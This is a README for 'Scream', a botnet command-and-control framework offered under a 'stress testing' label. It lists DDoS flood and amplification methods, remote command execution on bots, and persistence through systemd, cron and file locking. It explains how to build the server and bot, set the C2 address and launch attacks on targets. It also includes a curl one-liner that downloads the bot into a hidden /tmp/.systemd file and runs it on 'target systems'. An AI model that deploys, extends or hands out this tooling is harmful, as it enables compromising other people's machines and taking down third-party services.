# Scream C2 Framework - README

## Overview
Scream is a lightweight Command and Control (C2) framework with integrated stress testing capabilities. This framework provides a web-based interface for managing a botnet and launching various types of network stress tests.

<table>
  <tr>
    <td><img src="https://github.com/user-attachments/assets/736a91e2-4c10-439e-9bf7-128ec9ee7841" width="100%"/></td>
    <td><img src="https://github.com/user-attachments/assets/122e26d1-1b6c-4065-acb3-7af89746fb6a" width="100%"/></td>
  </tr>
  <tr>
    <td><img src="https://github.com/user-attachments/assets/948fb62d-5861-4963-8c15-ee110c31e21d" width="100%"/></td>
    <td><img src="https://github.com/user-attachments/assets/42758c97-a105-4798-a82a-a3229643f98e" width="100%"/></td>
  </tr>
</table>
![image](https://github.com/user-attachments/assets/42758c97-a105-4798-a82a-a3229643f98e)

## Features

### Web-based Management Interface
- Real-time bot monitoring  
- Attack control panel  
- User management system  
- Attack history tracking  

### Stress Testing Capabilities
- UDP Flood  
- TCP Flood  
- SYN Flood  
- ACK Flood  
- GRE Flood  
- DNS Amplification  
- HTTP Flood  

### Bot Management
- Automatic bot connection handling  
- Heartbeat monitoring  
- Hardware resource reporting  
- Remote command execution  

### Security Features
- Challenge-response authentication  
- TLS encrypted communications  
- Session management  
- Password complexity enforcement  

---

## Installation

### Prerequisites
- Go 1.18+ installed  
- Basic server with root access  
- Domain name (recommended for SSL)  

### Quick Start

**Clone the repository:**
```bash
git clone https://github.com/yourusername/scream-c2.git
cd scream-c2
```

**Build the server and bot:**
```bash
go build -o server main.go
go build -o bot bot.go
```

**Generate SSL certificates (if needed):**
```bash
./server --gen-cert
```

**Start the server:**
```bash
./server
```

**Deploy the bot to target systems.**

---

## Configuration

### Server Configuration
The server can be configured by modifying the constants in `main.go`:

```go
const (
    USERS_FILE          = "users.json"         // User database file
    BOT_SERVER_IP       = "0.0.0.0"            // Bot connection interface
    BOT_SERVER_PORT     = "7003"               // Bot connection port
    WEB_SERVER_IP       = "0.0.0.0"            // Web interface interface
    WEB_SERVER_PORT     = "443"                // Web interface port
    CERT_FILE           = "server.crt"         // SSL certificate
    KEY_FILE            = "server.key"         // SSL private key
)
```

### Bot Configuration
Modify the C2 address in `bot.go`:

```go
const (
    C2Address = "your.server.ip:7003" // Change to your server's IP/domain
)
```

---

## Usage

### Accessing the Web Interface
Navigate to `https://your-server-ip` in your browser

**Login with the default credentials:**
- **Username:** `root`
- **Password:** *(generated on first run, check console output)*

### Managing Bots
- The dashboard shows all connected bots  
- View bot details by clicking on a bot in the list  
- Monitor bot status (active/inactive) via the status indicator  

### Launching Attacks
- Select an attack method from the dropdown  
- Enter the target IP/hostname  
- Specify the target port  
- Set the duration (in seconds)  
- Click **"Initiate Attack Sequence"**

### User Management
Admin/Owner users can:
- Create new users  
- Delete existing users  
- Modify user access levels  

---

## Security Considerations

⚠️ **Important Security Notes:**
- Change the default root password immediately after first login  
- Use strong, complex passwords for all user accounts  
- Restrict access to the web interface (firewall rules, VPN, etc.)  
- Regularly monitor and audit user activity  
- Keep the server software updated  

---

## Bot Deployment

### Linux Deployment

```bash
# Download and execute
curl http://your-server-ip/bot -o /tmp/.systemd && chmod +x /tmp/.systemd && /tmp/.systemd
```

### Persistence Methods
The bot includes several persistence mechanisms:
- Systemd service  
- Cron job  
- File locking (prevent deletion)  

---

## Troubleshooting

### Common Issues

#### Bots not connecting:
- Verify the C2 address in the bot binary  
- Check firewall rules on the server  
- Ensure the bot server is running on the correct port  

#### Web interface not loading:
- Verify SSL certificates are properly configured  
- Check if the web server is running  
- Ensure port 443 (or your configured port) is open  

#### Attack not working:
- Verify target IP/port is correct  
- Check if bots are properly connected  
- Ensure the attack method is appropriate for the target  

---

## License
This software is provided for educational and research purposes only. The authors are not responsible for any misuse of this tool.
